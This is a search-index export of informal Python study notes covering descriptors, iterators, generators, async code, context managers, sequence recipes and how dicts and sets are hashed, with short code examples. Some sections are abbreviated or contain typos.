listing Attribute descriptors <code>__get__</code> Descriptor get <code>__set__</code> Descriptor set <code>__delete__</code> Descriptor deletion <code>__set_name__</code> Descriptor set name Class services <code>__prepare__</code> Class creation <code>__init_subclass__</code> Subclass initialization <code>__instancecheck__</code> Instance check <code>__subclasscheck__</code> Subclass check <p>Why <code>len</code> is not a method</p> <p><code>len</code> runs very fast when <code>x</code> is a built-in type. No method is called for built-in types in CPython; length is simply read from a field from the C struct. <code>len</code> is not called as methods, but in our Python objects, it works as normal.</p>"},{"location":"python/classes/data_model/#data-structure","title":"Data Structure","text":"<p>Every Python object in a C struct has two fields:</p> <ul> <li><code>ob_refcnt</code> and <code>ob_fval</code>: reference count and pointer value.</li> </ul>"},{"location":"python/classes/data_model/#mutable-sequences-vs-immutable","title":"Mutable Sequences vs Immutable","text":"<ul> <li>Mutable: list, bytearray, array.array, collections.deque, and memoryview.</li> <li>Immutable: tuple, str, and bytes.</li> </ul> <p>TIP In Python code, line breaks are ignored inside pairs of [], {}, or (). So you can build multiline lists, listcomps, genexps, dictionaries, and the like without using the ugly \\ line continuation escape. Also, when those delimiters are used to define a literal with a comma-separated series of items, a trailing comma will be ignored. So, for example, when coding a multi-line list literal, it is thoughtful to put a comma after the last item.</p>"},{"location":"python/classes/data_model/#list-comps-versus-map-and-filter","title":"List Comps Versus <code>map</code> and <code>filter</code>","text":"<p><code>map</code> and <code>filter</code> were faster, but nowadays they are the same.</p> <p>Tuple is not just immutable lists. It can be used as immutable lists or records with no field names (1,2) lat long.</p> <p>If you write internationalized software, <code>_</code> is not a good dummy variable because it is traditionally used as an alias to the <code>gettext.gettext</code> function, as recommended in the <code>gettext</code> module documentation. Otherwise, it\u2019s a conventional name for a placeholder variable to be ignored.</p> <p>Tuple as Immutable List 1. Clarity: You know it never changes. 2. Performance: It uses less memory.</p> <p>Are tuples more efficient than lists?</p> <p>Raymond Hettinger answers: - To evaluate a tuple, Python generates bytecode in constant one operation, but for a list, it pushes every element as a separate constant to data stacks and builds the list. - Hashable tuple: <code>tuple(t)</code> returns a reference to the same <code>t</code>. No need to copy; the list makes a copy anyway. - For fixed length, exact memory is allocated. The list has room to spare for the future. - References to items of a tuple are stored in an array with the tuple struct itself. The list holds a pointer to the array of references stored elsewhere and makes the CPU cache less effective. But it is necessary because of the need to make room.</p> <p>Slicing <code>seq[start:stop:step]</code> - Python calls <code>seq.getitem(slice(start, stop, step))</code>.</p> <p>Building a List of Objects <pre><code>my_list = [[]] * 3 # same board appended, one changes everyone changes\n\nboard = [['_'] * 3 for i in range(3)] # no problem\n</code></pre></p> <p>When List is Not the Answer If it contains the same type, maybe <code>array.array</code> will be better. You can dump it to a binary file directly, and it's memory-efficient.</p> <p>Queue Why don't use List as a queue? Because every item has to be shifted in memory.</p> <p>Use <code>collections.deque</code> instead; it is thread-safe and has the <code>maxlen</code> attribute. There are more queues: - <code>queue</code>: <code>SimpleQueue</code>, <code>Queue</code>, <code>LifoQueue</code>, and <code>PriorityQueue</code>. - <code>multiprocessing</code>: <code>SimpleQueue</code> and bounded <code>Queue</code> - very similar to those in the <code>queue</code> package but designed for interprocess communication. A specialized <code>multiprocessing.JoinableQueue</code>. - <code>asyncio</code>: Provides <code>Queue</code>, <code>LifoQueue</code>, <code>PriorityQueue</code>, and <code>JoinableQueue</code>. - <code>heap</code>: <code>heappush</code>, <code>heappop</code>.</p> <p>Flat vs Container Sequence Flat is all the same type.</p> <p><code>hash()</code> Calling <code>hash(t)</code> on a tuple is a quick way to assert that its value is fixed. A <code>TypeError</code> will be raised if <code>t</code> contains mutable items.</p> <p>Decode vs Encode Imagine <code>str</code> is human-readable bytes; don't. Bytes need decoding; string encoding.</p>"},{"location":"python/classes/descriptors/","title":"Descriptors","text":"<pre><code>class DescriptorClass:\n    def __get__(self, instance, owner):\n        if instance is None:\n            return self\n        print(\n        self.__class__.__name__,\n        instance,\n        owner)\n        return instance\n\nclass ClientClass:\n    descriptor = DescriptorClass()\n\nclient = ClientClass()\nclient.descriptor\n</code></pre>"},{"location":"python/classes/descriptors/#descriptor-methods","title":"Descriptor Methods","text":"<ul> <li> <p><code>__get__(self, instance, owner)</code>: The <code>__get__</code> method of the descriptor class. It takes three arguments: <code>self</code>, <code>instance</code> (where the descriptor is called from), and <code>owner</code> (a reference to the class object). <code>owner</code> is the same as <code>instance.__class__</code>.</p> </li> <li> <p><code>__set__(self, instance, value)</code>: The <code>__set__</code> method of the descriptor class. It is called when assigning a value to the descriptor. Example usage: <code>client.descriptor = 'value'</code>.</p> </li> <li> <p><code>__delete__(self, instance)</code>: The <code>__delete__</code> method of the descriptor class. It is called when deleting the descriptor. Example usage: <code>del client.descriptor</code>.</p> </li> <li> <p><code>__set_name__(self, owner, name)</code>: The <code>__set_name__</code> method of the descriptor class. It is called during the class creation and provides the field name.</p> </li> </ul> <pre><code>class DescriptorWithName:\n    def __init__(self, name):\n        self.name = name\n    def __get__(self, instance, value):\n        if instance is None:\n            return self\n        print(self.name, instance)\n        return instance.__dict__[self.name]\n    def __set__(self, instance, value):\n        instance.__dict__[self.name] = value\n\nclass ClientClass:\n    descriptor = DescriptorWithName(\"descriptor\")\n</code></pre>"},{"location":"python/classes/descriptors/#descriptor-types","title":"Descriptor Types","text":"<ul> <li> <p>Non-data descriptor: Implements only the <code>__get__</code> method.</p> </li> <li> <p>Data descriptor: Implements both the <code>__get__</code> and <code>__set__</code> methods.</p> </li> </ul> <p>Why is it accessing the <code>__dict__</code> attribute of the instance directly? Another good question, which also has at least two explanations. First, you might be thinking why not just do the following? <code>setattr(instance, \"descriptor\", value)</code></p> <p>Remember that this method (<code>__set__</code>) is called when we try to assign something to the attribute that is a descriptor. So, using <code>setattr()</code> will call this descriptor again, which, in turn, will call it again, and so on and so forth. This will end up in an infinite recursion.</p> <p>Why, then, is the descriptor not able to book-keep the values of the properties for all of its objects? The client class already has a reference to the descriptor. If we add a reference from the descriptor back to the client object, we are creating circular dependencies, and these objects will never be garbage-collected. Since they are pointing at each other, their reference counts will never drop below the threshold for removal, and that will cause memory leaks in our program.</p> <p>A possible alternative here is to use weak references, with the <code>weakref</code> module, and create a weak reference key dictionary if we want to do that. This implementation is explained later on in this chapter, but for the implementations within this book, we prefer to use this idiom (and not <code>weakref</code>), since it is fairly common and accepted when writing descriptors. As of now, we have studied the different kinds of descriptors, what they are, and how they work, and we even got a first idea of how we can use them to our advantage. The next section emphasizes precisely that last point: we'll see descriptors in action. From now on, we'll take a more practical approach, and see how we can use descriptors to achieve better code. After that, we'll even explore examples of good descriptors.</p>"},{"location":"python/classes/descriptors/#functions-and-methods","title":"Functions and Methods","text":"<p>The most resonating case of an object that is a descriptor is probably a function. Functions implement the <code>__get__</code> method, so they can work as methods when defined inside a class. In Python, methods are just regular functions, only they take an extra argument. By convention, the first argument of a method is named <code>self</code>, and it represents an instance of the class that the method is being defined in. Then, whatever the method does with <code>self</code> would be the same as any other function receiving the object and applying modifications to it. In other words, when we define something like this:</p> <pre><code>class MyClass:\n    def method(self, ...):\n        self.x = 1\n</code></pre> <p>Since functions implement the descriptor protocol, before calling the method, the <code>__get__</code> method is invoked first. Then, within this <code>__get__</code> method, some transformations happen before running the code on the internal callable.</p>"},{"location":"python/classes/descriptors/#function-as-descriptor","title":"Function as Descriptor","text":"<pre><code>from types import MethodType\n\nclass Method:\n    def __init__(self, name):\n        self.name = name\n    def __call__(self, instance, arg1, arg2):\n        print(f\"{self.name}: {instance} called with {arg1} and {arg2}\")\n    def __get__(self, instance, owner):\n        if instance is None:\n            return self\n        return MethodType(self, instance)\n</code></pre> <p>Since this is a very elegant solution, it's worth exploring it to keep it in mind as a Pythonic approach when defining our own objects. For instance, if we were to define our own callable, it would be a good idea to also make it a descriptor so that we can use it in classes as class attributes as well. ```</p>"},{"location":"python/classes/iterators/","title":"Iterators","text":""},{"location":"python/classes/iterators/#generators","title":"Generators","text":"<p>Generators were introduced in Python a long time ago (PEP-255), with the idea of introducing iteration in Python while improving the performance of the program (by using less memory) at the same time. The idea of a generator is to create an object that is iterable and, while it's being iterated, will produce the elements it contains, one at a time. The main use of generators is to save memory\u2014instead of having a very large list of elements in memory, holding everything at once, we have an object that knows how to produce each particular element, one at a time, as it is required. This feature enables lazy computations of heavyweight objects in memory, in a similar manner to what other functional programming languages (Haskell, for instance) provide. It would even be possible to work with infinite sequences because the lazy nature of generators enables such an option.</p>"},{"location":"python/classes/iterators/#next","title":"<code>next()</code>","text":"<p>The <code>next()</code> built-in function will advance the iterable to its next element and return it.</p>"},{"location":"python/classes/iterators/#itertools","title":"<code>itertools</code>","text":"<pre><code>def process(self):\n    for purchase in self.purchases:\n        if purchase &gt; 1000.0:\n            ...\n</code></pre> <p>This is not only non-Pythonic, but it's also rigid (and rigidity is a trait that denotes bad code). It doesn't handle changes very well. What if the number changes now? Do we pass it by parameter? What if we need more than one? What if the condition is different (less than, for instance)? Do we pass a lambda? These questions should not be answered by this object, whose sole responsibility is to compute a set of well-defined metrics over a stream of purchases represented as numbers. And, of course, the answer is no. It would be a huge mistake to make such a change (once again, clean code is flexible, and we don't want to make it rigid by coupling this object to external factors). These requirements will have to be addressed elsewhere.</p>"},{"location":"python/classes/iterators/#itertoolsislice-takes-first-ten","title":"<code>itertools.islice</code> - Takes First Ten","text":"<pre><code>from itertools import islice\n\npurchases = islice(filter(lambda p: p &gt; 1000.0, purchases), 10)\n</code></pre> <p>There is no memory penalization for filtering this way because since they are all generators, the evaluation is always lazy. This gives us the power of thinking as if we had filtered the entire set at once and then passed it to the object, but without actually fitting everything in memory. Keep in mind the trade-off mentioned at the beginning of the chapter, between memory and CPU usage. While the code might use less memory, it could take up more CPU time, but most of the times, this is acceptable when we have to process lots of objects in memory while keeping the code maintainable.</p>"},{"location":"python/classes/iterators/#repeated-iterations-with-itertoolstee","title":"Repeated Iterations with <code>itertools.tee</code>","text":"<pre><code>def process_purchases(purchases):\n    min_, max_, avg = itertools.tee(purchases, 3)\n    return min(min_), max(max_), median(avg)\n</code></pre> <p>In this example, <code>itertools.tee</code> will split the original iterable into three new ones. We will use each of these for the different kinds of iterations that we require, without needing to repeat three different loops over purchases.</p>"},{"location":"python/classes/iterators/#yielding","title":"Yielding","text":"<pre><code>def _iterate_array2d(array2d):\n    for i, row in enumerate(array2d):\n        for j, cell in enumerate(row):\n            yield (i, j), cell\n</code></pre> <pre><code>def search_nested(array, desired_value):\n    try:\n        coord = next(\n            coord\n            for (coord, cell) in _iterate_array2d(array)\n            if cell == desired_value\n        )\n    except StopIteration as e:\n        raise ValueError(f\"{desired_value} not found\") from e\n    logger.info(\"value %r found at [%i, %i]\", desired_value, *coord)\n    return coord\n</code></pre>"},{"location":"python/classes/iterators/#iterator-but-not-iterable","title":"Iterator but Not Iterable","text":"<pre><code>class SequenceIterator:\n    def __init__(self, start=0, step=1):\n        self.current = start\n        self.step = step\n    def __next__(self):\n        value = self.current\n        self.current += self.step\n        return value\n</code></pre>"},{"location":"python/classes/iterators/#sequence-are-iterables","title":"Sequence are Iterables","text":"<pre><code>class MappedRange:\n    \"\"\"Apply a transformation to a range of numbers.\"\"\"\n    def __init__(self, transformation, start, end):\n        self._transformation = transformation\n        self._wrapped = range(start, end)\n    def __getitem__(self, index):\n        value = self._wrapped.__getitem__(index)\n        result = self._transformation(value)\n        logger.info(\"Index %d: %s\", index, result)\n        return result\n    def __len__(self):\n        return len(self._wrapped)\n</code></pre>"},{"location":"python/classes/iterators/#coroutines","title":"Coroutines","text":"<ul> <li><code>.close()</code></li> <li><code>.throw()</code></li> <li><code>.send()</code></li> </ul> <p>Python takes advantage of generators in order to create coroutines. Because generators can naturally suspend, they're a convenient starting point. But generators weren't enough as they were originally thought to be, so these methods were added. This is because typically, it's not enough to just be able to suspend some part of the code; you'd also want to communicate with it (pass data and signal changes in the context).</p>"},{"location":"python/classes/iterators/#close","title":"<code>close()</code>","text":"<p>When calling this method, the generator will receive the <code>GeneratorExit</code> exception. If it's not handled, then the generator will finish without producing any more values, and its iteration will stop.</p>"},{"location":"python/classes/iterators/#throw","title":"<code>throw()</code>","text":"<p>This method will throw the exception at the line where the generator is currently suspended. If the generator handles the exception that was sent, the code in that particular <code>except</code> clause will be called; otherwise, the exception will propagate to the caller.</p> <pre><code>def stream_data(db_handler):\n    while True:\n        try:\n            yield db_handler.read_n_records(10)\n        except CustomException as e:\n            logger.info(\"controlled error %r, continuing\", e)\n        except Exception as e:\n            logger.info(\"unhandled error %r, stopping\", e)\n            db_handler.close()\n            break\n</code></pre>"},{"location":"python/classes/iterators/#sendvalue","title":"<code>send(value)</code>","text":"<pre><code>def stream_db_records(db_handler):\n    retrieved_data = None\n    previous_page_size = 10\n    try:\n        while True:\n            page_size = yield retrieved_data\n            if page_size is None:\n                page_size = previous_page_size\n            previous_page_size = page_size\n            retrieved_data = db_handler.read_n_records(page_size)\n    except GeneratorExit:\n        db_handler.close()\n</code></pre> <p>First None</p>"},{"location":"python/classes/iterators/#yield-from","title":"<code>yield from</code>","text":"<p><code>yield from iterable</code></p>"},{"location":"python/classes/iterators/#async-programming","title":"Async Programming","text":""},{"location":"python/classes/iterators/#async-context-managers","title":"Async Context Managers","text":"<pre><code>@contextlib.asynccontextmanager\nasync def db_management():\n    try:\n        await stop_database()\n        yield\n    finally:\n        await start_database()\n</code></pre> <pre><code>import asyncio\nimport random\n\nasync def coroutine():\n    await asyncio.sleep(0.1)\n    return random.randint(1, 10000)\n\nclass RecordStreamer:\n    def __init__(self, max_rows=100):\n        self._current_row = 0\n        self._max_rows = max_rows\n    def __aiter__(self):\n        return self\n    async def __anext__(self):\n        if self._current_row &lt; self._max_rows:\n            row = (self._current_row, await coroutine())\n            self._current_row += 1\n            return row\n        raise StopAsyncIteration\n</code></pre> <p><code>await async_iterator.__anext__()</code></p>"},{"location":"python/classes/iterators/#async-generators","title":"Async Generators","text":"<pre><code>async def record_streamer(max_rows):\n    current_row = 0\n    while current_row &lt; max_rows:\n        row = (current_row, await coroutine())\n        current_row += 1\n        yield row\n</code></pre>"},{"location":"python/context_managers/context_managers/","title":"Context Managers","text":""},{"location":"python/context_managers/context_managers/#example","title":"EXAMPLE","text":"<pre><code>class ListTransaction:\n    def __init__(self,thelist):\n        self.thelist = thelist\n\n    def __enter__(self):\n        self.workingcopy = list(self.thelist)\n        return self.workingcopy\n\n    def __exit__(self,type,value,tb):\n        if type is None:\n            self.thelist[:] = self.workingcopy\n        return False\n</code></pre>"},{"location":"python/context_managers/context_managers/#reading-files-using-context-manager-with-chunks","title":"READING FILES USING CONTEXT MANAGER WITH CHUNKS","text":"<pre><code>with open('data.txt') as file:\n    while (chunk := file.read(10000)):\n        print(chunk, end='')\n</code></pre>"},{"location":"python/data_types/data_types/","title":"Overview","text":""},{"location":"python/data_types/data_types/#literals","title":"LITERALS","text":"<p>0b101010         # Binary integer 0o52             # Octal integer 0x2a             # Hexadecimal integer</p>"},{"location":"python/data_types/data_types/#unpacking-sequences-into-variables","title":"Unpacking Sequences into Variables","text":"<p>Unpacking can be very useful for assigning multiple variables from a single sequence. Let's see some examples:</p> <pre><code>p = (4,5)\nx, y = p\nprint(x)\n</code></pre> <p>Output: <pre><code>4\n</code></pre></p>"},{"location":"python/data_types/data_types/#using-_-as-a-throwaway-variable","title":"Using _ as a Throwaway Variable","text":"<p>When unpacking, you can use <code>_</code> as a throwaway variable for certain values you're going to discard.</p> <pre><code>data = ['ACME', 50, 91.1, (2012, 12, 21)]\nname, shares, price, date = data\n_, shares, _, date = data\n</code></pre> <p>Output: <pre><code>'ACME'\n</code></pre></p>"},{"location":"python/data_types/data_types/#unpacking-n-elements","title":"Unpacking N Elements","text":"<p>You can unpack elements flexibly using the <code>*</code> symbol:</p> <pre><code>record = ('Dave', 'dave@example.com', '773-555-1212', '847-555-1212')\nname, email, *phone_numbers = record\nprint(phone_numbers)\n</code></pre> <p>Output: <pre><code>['773-555-1212', '847-555-1212']\n</code></pre></p>"},{"location":"python/data_types/data_types/#string-split-example","title":"String Split Example","text":"<p>Strings can be split and unpacked easily:</p> <pre><code>line = 'nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false'\nuname, *fields, homedir, sh = line.split(':')\nprint(uname)\n</code></pre> <p>Output: <pre><code>'nobody'\n</code></pre></p>"},{"location":"python/data_types/data_types/#working-with-deques","title":"Working with Deques","text":"<p><code>collections.deque</code> provides a double-ended queue that supports adding and removing elements from both ends in O(1) time.</p> <pre><code>from collections import deque\nq = deque(maxlen=3)\nq.append(1)\nq.append(2)\nq.append(3)\nq.append(4)\nprint(q)\n</code></pre> <p>Output: <pre><code>deque([2, 3, 4])\n</code></pre></p>"},{"location":"python/data_types/data_types/#appending-to-a-queue","title":"Appending to a Queue","text":"<pre><code>q.appendleft(4)\nprint(q)\n</code></pre> <p>Output: <pre><code>deque([4, 2])\n</code></pre></p>"},{"location":"python/data_types/data_types/#finding-the-largest-or-smallest-n-items","title":"Finding the Largest or Smallest N Items","text":"<p>The <code>heapq</code> module provides functions to find the N smallest or largest items.</p> <pre><code>import heapq\n# ... [rest of the code]\nprint(cheap)\nprint(expensive)\n</code></pre>"},{"location":"python/data_types/data_types/#113-sorting-a-list-of-dictionaries-by-a-common-key","title":"1.13 Sorting a List of Dictionaries by a common key","text":"<pre><code>rows = [\n    {'fname': 'Brian', 'lname': 'Jones', 'uid': 1003},\n    {'fname': 'David', 'lname': 'Beazley', 'uid': 1002},\n    {'fname': 'John', 'lname': 'Cleese', 'uid': 1001},\n    {'fname': 'Big', 'lname': 'Jones', 'uid': 1004}\n]\n\nfrom operator import itemgetter\n\nrows_by_fname = sorted(rows, key=itemgetter('fname'))\nrows_by_uid = sorted(rows, key=itemgetter('uid'))\nprint(rows_by_fname)\nprint(rows_by_uid)\n\nrows_by_lfname = sorted(rows, key=itemgetter('lname','fname'))\nprint(rows_by_lfname)\n</code></pre>"},{"location":"python/data_types/data_types/#115-grouping-records-based-on-a-field","title":"1.15 Grouping Records Based on a Field","text":"<pre><code>rows = [\n    ...\n]\nfrom operator import itemgetter\nfrom itertools import groupby\n...\n\nfor date, items in groupby(rows, key=itemgetter('date')):\n    print(date)\n    for i in items:\n        print('    ', i)\n</code></pre>"},{"location":"python/data_types/data_types/#116-filtering-list","title":"1.16 Filtering List","text":"<pre><code>addresses = [\n    ...\n]\ncounts = [ ... ]\n\nfrom itertools import compress\nmore5 = [n &gt; 5 for n in counts]\n\nlist(compress(addresses, more5))\n</code></pre>"},{"location":"python/data_types/data_types/#117-subset-of-dictionary","title":"1.17 Subset of Dictionary","text":"<pre><code>prices = {\n    ...\n}\n\np1 = { key:value for key, value in prices.items() if value &gt; 200 }\n...\n</code></pre> <p>... [and so on, structuring each section with a Markdown header and enclosing the code in triple backticks for code blocks]</p>"},{"location":"python/data_types/data_types/#213-aligning-text-strings","title":"2.13. Aligning Text Strings","text":"<pre><code>text = 'Hello World'\n\ntext.ljust(20)\ntext.rjust(20)\n...\n</code></pre>"},{"location":"python/data_types/data_types/#312-time-objects","title":"3.12 Time Objects","text":"<p>Working with <code>datetime.timedelta</code>:</p> <pre><code>from datetime import timedelta\n\na = timedelta(days=2, hours=6)\nb = timedelta(hours=4.5)\nc = a + b\nprint(c.days)  # 2\nprint(c.seconds)  # 37800\nprint(c.total_seconds())  # 210600.0\n</code></pre> <p>Working with <code>datetime.datetime</code>:</p> <pre><code>from datetime import datetime\n\na = datetime(2012, 9, 23)\nprint(a + timedelta(days=10))  # 2012-10-03 00:00:00\n\nb = datetime(2012, 12, 21)\nd = b - a\nprint(d)  # datetime.timedelta(days=89)\n</code></pre>"},{"location":"python/data_types/data_types/#313-finding-last-occurrence-of-a-weekday","title":"3.13 Finding Last Occurrence of a Weekday","text":"<pre><code>from datetime import datetime, timedelta\nfrom dateutil.relativedelta import relativedelta\nfrom dateutil.rrule import *\n\nweekdays = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday']\n\ndef get_previous_byday(dayname, start_date=None):\n    # ... [rest of the function here]\n</code></pre>"},{"location":"python/data_types/data_types/#315-convert-string-into-datetime","title":"3.15 Convert String into Datetime","text":"<pre><code>from datetime import datetime\n\ntext = '2012-09-20'\ny = datetime.strptime(text, '%Y-%m-%d')\nprint(y)  # datetime.datetime(2012, 9, 20, 0, 0)\n</code></pre>"},{"location":"python/data_types/data_types/#41-manually-consuming-an-iterator","title":"4.1 Manually Consuming an Iterator","text":"<pre><code>with open('/etc/passwd') as f:\n    # ... [rest of the code here]\n</code></pre>"},{"location":"python/data_types/data_types/#43-generators","title":"4.3 Generators","text":"<pre><code>def frange(start, stop, increment):\n    # ... [rest of the function here]\n</code></pre>"},{"location":"python/data_types/data_types/#45-reversed-iterator","title":"4.5 Reversed Iterator","text":"<pre><code>class Countdown:\n    # ... [rest of the class here]\n</code></pre>"},{"location":"python/data_types/data_types/#46-generator-functions-with-extra-state","title":"4.6 Generator Functions with Extra State","text":"<pre><code>from collections import deque\n\nclass linehistory:\n    # ... [rest of the class here]\n</code></pre>"},{"location":"python/data_types/data_types/#47-taking-slice-of-an-iterator","title":"4.7 Taking Slice of an Iterator","text":"<pre><code>def count(n):\n    # ... [rest of the function here]\n</code></pre>"},{"location":"python/data_types/data_types/#48-user-database","title":"4.8 User Database","text":"<pre><code>from itertools import dropwhile\n\nwith open('/etc/passwd') as f:\n    # ... [rest of the code here]\n</code></pre>"},{"location":"python/data_types/data_types/#49-iterate-all-possible-combinations","title":"4.9 Iterate All Possible Combinations","text":"<pre><code>items = ['a', 'b', 'c']\nfrom itertools import permutations\n# ... [rest of the code here]\n</code></pre>"},{"location":"python/data_types/data_types/#411-iterating-over-multiple-sequences-simultaneously","title":"4.11 Iterating Over Multiple Sequences Simultaneously","text":"<pre><code>xpts = [1,5,4,2,10,7]\nypts = [101, 78, 37, 15, 62, 99]\n# ... [rest of the code here]\n</code></pre>"},{"location":"python/data_types/data_types/#412-using-itertoolschain","title":"4.12 Using <code>itertools.chain</code>","text":"<pre><code>from itertools import chain\n\na = [1, 2, 3, 4]\nb = ['x', 'y', 'z']\nfor x in chain(a, b):\n    print(x)\n</code></pre>"},{"location":"python/data_types/dic_set/","title":"Dict & Set","text":"<p>dict vs set what is hashable</p> <p>An object is hashable if it has a hash value which never changes during its lifetime (it needs a hash() method), and can be compared to other objects (it needs an eq() method). Hashable objects which compare equal must have the same hash value. [...]</p> <p>User-defined types are hashable by default because their hash code is their id() and the eq() method inherited from the object class simply compares the object ids. If an object implements a custom eq() which takes into account its internal state, it will be hashable only if its hash() always returns the same hash code. In practice, this requires that eq() and hash() only take into account instance attributes that never change during the life of the object. missing keys with setdefault</p> <p>d.get(k, default) my_dict.setdefault(key, []).append(new_value) missing with missinng</p> <p>o subclass dict or any other mapping type and add a missing method. Both solutions are covered next.</p> <p>The missing method is only called by getitem (i.e., for the d[k] operator). The presence of a missing method has no effect on the behavior of other methods that look up keys, such as get or contains (which implements the in operator). This is why the default_factory of defaultdict works only with getitem, as noted in the warning at the end of the previous section. subclass builtin</p> <p>A better way to create a user-defined mapping type is to subclass collections.UserDict instead of dict (as we\u2019ll do in Example 3-8). Here we subclass dict just to show that missing is supported by the built-in dict.getitem method dict variations</p> <pre><code>collections.OrderedDict\ncollections.ChainMap\nChainMap(locals(), globals(), vars(builtins))\ncollections.Counter\n</code></pre> <p>custom mapping</p> <pre><code>collections.UserDict\ntyping.TypedDict The collections.UserDict class behaves like a dict, but it is slower because it is implemented in Python, not in C. We\u2019ll cover it in more detail next\n</code></pre> <p>Set Theory</p> <p>Set elements must be hashable. The set type is not hashable, so you can\u2019t build a set with nested set instances. But frozenset is hashable, so you can have frozenset elements inside a set.</p> <p>n CPython built for a 64-bit CPU, each bucket in a set has two fields: a 64-bit hash code, and a 64-bit pointer to the element value\u2014which is a Python object stored elsewhere in memory. Because buckets have a fixed size, access to an individual bucket is done by offset. There is no field for the indexes from 0 to 7 The hash() built-in function works directly with built-in types and falls back to calling hash for user-defined types. If two objects compare equal, their hash codes must also be equal, otherwise the hash table algorithm does not work. For example, because 1 == 1.0 is True, hash(1) == hash(1.0) must also be True, even though the internal representation of an int and a float are very different. Also, to be effective as hash table indexes, hash codes should scatter around the index space as much as possible. This means that, ideally, objects that are similar but not equal should have hash codes that differ widely. Example 3-17 is the output of a script to compare the bit patterns of hash codes. Note how the hashes of 1 and 1.0 are the same, but those of 1.0001, 1.0002, and 1.0003 are very different. salt value of hash</p> <p>Starting with Python 3.3, a random salt value is included when computing hash codes for str, bytes, and datetime objects, as documented in Issue 13703\u2014Hash collision security issue. The salt value is constant within a Python process but varies between interpreter runs. With PEP-456, Python 3.4 adopted the SipHash cryptographic function to compute hash codes for str and bytes objects. The random salt and SipHash are security measures to prevent DoS attacks. Details are in a note in the documentation for the hash special method. hasing in python</p> <p>As mentioned earlier, the hash table for a set starts with 8 empty buckets. As elements are added, Python makes sure at least \u2153 of the buckets are empty\u2014doubling the size of the hash table when more space is needed. The hash code field of each bucket is initialized with -1, which means \u201cno hash code\u201d</p> <p>iven the literal {'Mon', 'Tue', 'Wed', 'Thu', 'Fri'}, Python gets the hash code for the first element, 'Mon'. For example, here is a realistic hash code for 'Mon'\u2014you\u2019ll probably get a different result because of the random salt Python uses to compute the hash code of string</p> <p>Python takes the modulus of the hash code with the table size to find a hash table index. Here the table size is 8, and the modulus is 3:</p> <p>Probing consists of computing the index from the hash, then looking at the corresponding bucket in the hash table. In this case, Python looks at the bucket at offset 3 and finds -1 in the hash code field, marking an empty bucke</p> <p>Python stores the hash code of the new element, 4199492796428269555, in the hash code field at offset 3, and a pointer to the string object 'Mon' in the element field. Figure 3-5 shows the current state of the hash table</p> <p>For the second element, 'Tue', steps 1, 2, 3 above are repeated. The hash code for 'Tue' is 2414279730484651250, and the resulting index is 2.</p> <p>When adding 'Wed' to the set, Python computes the hash -5145319347887138165 and index 3. Python probes bucket 3 and sees that it is already taken. But the hash code stored there, 4199492796428269555 is different. As discussed in \u201cHashes and equality\u201d, if two objects have different hashes, then their value is also different. This is an index collision. Python then probes the next bucket and finds it empty. So 'Wed' ends up at index 4, as shown in Figure 3-7.</p> <p>Adding the next element, 'Thu', is boring: there\u2019s no collision, and it lands in its natural bucket, at index 7. Placing 'Fri' is more interesting. Its hash, 7021641685991143771 implies index 3, which is taken by 'Mon'. Probing the next bucket\u20144\u2014 Python finds the hash for 'Wed' stored there. The hash codes don\u2019t match, so this is another index collision. Python probes the next bucket. It\u2019s empty, so 'Fri' ends up at index 5. The end state of the hash table is shown in Figure 3-8.</p> <p>ahsh table for the set {'Mon', 'Tue', 'Wed', 'Thu', 'Fri'}. It is now 62.5% full\u2014close to the \u2154 threshold.</p>"},{"location":"python/data_types/list_tuple/","title":"List & Tuple","text":""},{"location":"python/data_types/list_tuple/#list-comprehension","title":"LIST COMPREHENSION","text":"<pre><code>[expression for item1 in iterable1 if condition1\n            for item2 in iterable2 if condition2\n ]\n</code></pre>"},{"location":"python/data_types/object/","title":"Object","text":"<p>Variables Are Not Boxes</p> <p>In 1997, I took a summer course on Java at MIT. The professor, Lynn Andrea Stein\u2014an award-winning computer science educator who currently teaches at Olin College of Engineering\u2014made the point that the usual \u201cvariables as boxes\u201d metaphor actually hinders the understanding of reference variables in OO languages. Python variables are like reference variables in Java, so it\u2019s better to think of them as labels attached to objects sentiel obj</p> <p>END_OF_DATA = object()</p>"},{"location":"python/data_types/object/#many-lines","title":"... many lines","text":"<p>def traverse(...):</p>"},{"location":"python/data_types/object/#more-lines","title":"... more lines","text":"<p>if node is END_OF_DATA:     raise StopIteration</p>"},{"location":"python/data_types/object/#etc","title":"etc.","text":"<p>Copies Are Shallow by Default Function Parameters as References</p> <p>In CPython, the primary algorithm for garbage collection is reference counting. Essentially, each object keeps count of how many references point to it. As soon as that refcount reaches zero, the object is immediately destroyed: CPython calls the del method on the object (if defined) and then frees the memory allocated to the object. In CPython 2.0, a generational garbage collection algorithm was added to detect groups of objects involved in reference cycles\u2014which may be unreachable even with outstanding references to them, when all the mutual references are contained within the group. Other implementations of Python have more sophisticated garbage collectors that do not rely on reference counting, which means the del method may not be called immediately when there are no more references to the object. See \u201cPyPy, Garbage Collection,</p> <p>wref = weakref.ref(a_set)</p> <p>weakref.finalize to register a callback function to be called when an object is destroyed The WeakValueDictionary Skit</p> <p>The class WeakValueDictionary implements a mutable mapping where the values are weak references to objects. When a referred object is garbage collected elsewhere in the program, the corresponding key is automatically removed from WeakValueDictionary. This is commonly used for caching. Our demonstration of a WeakValueDictionary is inspired by the classic Cheese Shop skit by Monty Python, in which a customer asks for more than 40 kinds of cheese, including cheddar and mozzarella, but none are in stock.</p> <p>import weakref</p> <pre><code>        stock = weakref.WeakValueDictionary() catalog = [Cheese('Red Leicester'), Cheese('Tilsit'), ... Cheese('Brie'), Cheese('Parmesan')] ... for cheese in catalog: ... stock[cheese.kind] = cheese ... sorted(stock.keys()) ['Brie', 'Parmesan', 'Red Leicester', 'Tilsit'] del catalog sorted(stock.keys()) ['Parmesan'] del cheese sorted(stock.keys())\n</code></pre> <p>A temporary variable may cause an object to last longer than expected by holding a reference to it. This is usually not a problem with local variables: they are destroyed when the function returns. But in Example 6-19, the for loop variable cheese is a global variable and will never go away unless explicitly deleted</p> <p>Not every Python object may be the target, or referent, of a weak reference. Basic list and dict instances may not be referents, but a plain subclass of either can solve this problem easily</p> <p>class MyList(list): \"\"\"list subclass whose instances may be weakly referenced\"\"\" a_list = MyList(range(10)) a_list can be the target of a weak reference</p> <p>wref_to_a_list = weakref.ref(a_list)</p> <p>I was surprised to learn that, for a tuple t, t[:] does not make a copy, but returns a reference to the same object</p>"},{"location":"python/decorators/decorators/","title":"Decorators","text":"<pre><code>@dataclass\nclass 